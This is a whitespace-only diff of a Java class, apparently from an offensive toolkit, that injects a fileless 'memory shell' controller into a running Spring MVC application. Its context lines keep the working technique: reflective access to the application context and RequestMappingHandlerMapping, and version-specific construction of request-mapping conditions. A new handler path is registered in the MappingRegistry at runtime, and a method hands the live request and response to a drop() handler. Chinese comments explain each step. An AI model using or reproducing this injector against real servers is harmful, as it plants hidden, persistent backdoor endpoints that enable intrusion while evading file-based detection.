@@ -14,11 +14,11 @@ public class SpringControllerMS {
     static {
         try {
             getClassLoader();
-            Class<?> utilClass         = s("org.springframework.web.servlet.support.RequestContextUtils");
-            Class<?> holder            = s("org.springframework.web.context.request.RequestContextHolder");
+            Class<?> utilClass = s("org.springframework.web.servlet.support.RequestContextUtils");
+            Class<?> holder = s("org.springframework.web.context.request.RequestContextHolder");
             Class<?> reqMappingHandler = s("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
 
-            Class<?> servletRequest     = s("javax.servlet.ServletRequest");
+            Class<?> servletRequest = s("javax.servlet.ServletRequest");
             Class<?> httpServletRequest = s("javax.servlet.http.HttpServletRequest");
 
             // 获取当前应用上下文
@@ -49,7 +49,7 @@ public class SpringControllerMS {
             Object mappingRegistry = f.get(mapping);
 
             // 反射调用 MappingRegistry 的 register 方法
-            Class<?> c  = s("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
+            Class<?> c = s("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
             Method[] ms = c.getDeclaredMethods();
 
             // 判断当前路径是否已经添加
@@ -74,16 +74,16 @@ public class SpringControllerMS {
             if (flag) {
                 // 初始化一些注册需要的信息
                 Boolean isSpringHigh = false;
-                Object  url;
-                Object  pPRC         = null;
-                Class   requestConditionClass;
+                Object url;
+                Object pPRC = null;
+                Class requestConditionClass;
 
                 // 高版本 Spring 期望使用 PathPatternsRequestCondition
                 try {
                     requestConditionClass = s("org.springframework.web.servlet.mvc.condition.PathPatternsRequestCondition");
 
-                    Class       pathPatternParserClass = s("org.springframework.web.util.pattern.PathPatternParser");
-                    Constructor constructor            = requestConditionClass.getDeclaredConstructor(pathPatternParserClass, String[].class);
+                    Class pathPatternParserClass = s("org.springframework.web.util.pattern.PathPatternParser");
+                    Constructor constructor = requestConditionClass.getDeclaredConstructor(pathPatternParserClass, String[].class);
                     constructor.setAccessible(true);
                     pPRC = constructor.newInstance(pathPatternParserClass.newInstance(), new String[]{pattern});
                     isSpringHigh = true;
@@ -97,12 +97,12 @@ public class SpringControllerMS {
                 url = constructor.newInstance(new Object[]{new String[]{pattern}});
 
                 Class<?> requestMethodsRequestCondition = s("org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition");
-                Class<?> requestMappingInfo             = s("org.springframework.web.servlet.mvc.method.RequestMappingInfo");
+                Class<?> requestMappingInfo = s("org.springframework.web.servlet.mvc.method.RequestMappingInfo");
 
-                Class<?> params           = s("org.springframework.web.servlet.mvc.condition.ParamsRequestCondition");
-                Class<?> headers          = s("org.springframework.web.servlet.mvc.condition.HeadersRequestCondition");
-                Class<?> consumes         = s("org.springframework.web.servlet.mvc.condition.ConsumesRequestCondition");
-                Class<?> produces         = s("org.springframework.web.servlet.mvc.condition.ProducesRequestCondition");
+                Class<?> params = s("org.springframework.web.servlet.mvc.condition.ParamsRequestCondition");
+                Class<?> headers = s("org.springframework.web.servlet.mvc.condition.HeadersRequestCondition");
+                Class<?> consumes = s("org.springframework.web.servlet.mvc.condition.ConsumesRequestCondition");
+                Class<?> produces = s("org.springframework.web.servlet.mvc.condition.ProducesRequestCondition");
                 Class<?> requestCondition = s("org.springframework.web.servlet.mvc.condition.RequestCondition");
 
                 // 实例化 RequestMethodsRequestCondition
@@ -167,12 +167,12 @@ public class SpringControllerMS {
     }
 
     public void readObjectToData() throws Exception {
-        Class<?> holder        = s("org.springframework.web.context.request.RequestContextHolder");
-        Method   getAttributes = getMethodByClass(holder, "currentRequestAttributes", new Class[]{});
+        Class<?> holder = s("org.springframework.web.context.request.RequestContextHolder");
+        Method getAttributes = getMethodByClass(holder, "currentRequestAttributes", new Class[]{});
         getAttributes.setAccessible(true);
         Object servletRequestAttributes = getAttributes.invoke(null);
-        Object request                  = getMethodAndInvoke(servletRequestAttributes, "getRequest", new Class[]{}, new Object[]{});
-        Object response                 = getMethodAndInvoke(servletRequestAttributes, "getResponse", new Class[]{}, new Object[]{});
+        Object request = getMethodAndInvoke(servletRequestAttributes, "getRequest", new Class[]{}, new Object[]{});
+        Object response = getMethodAndInvoke(servletRequestAttributes, "getResponse", new Class[]{}, new Object[]{});
         drop(request, response);
     }
 
